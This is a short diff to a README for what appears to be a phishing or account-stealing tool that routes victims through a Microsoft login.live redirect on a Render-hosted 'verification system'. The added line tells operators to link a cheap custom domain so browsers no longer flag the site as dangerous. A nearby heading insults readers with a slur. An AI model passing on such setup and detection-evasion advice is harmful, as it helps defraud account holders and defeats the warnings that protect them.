@@ -16,7 +16,7 @@ Preview:
 
 ## UPDATE 1
 
-Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify"
+Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify" I RECOMMEND GETTING A CHEAP CUSTOM DOMAIN AND LINKING IT TO RENDER TO AVOID THE "DANGEROUS WEBSITE" THING
 
 
 ## FOR RETARDS WHO TINK ITS DOUBLEHOOKED LOOK 
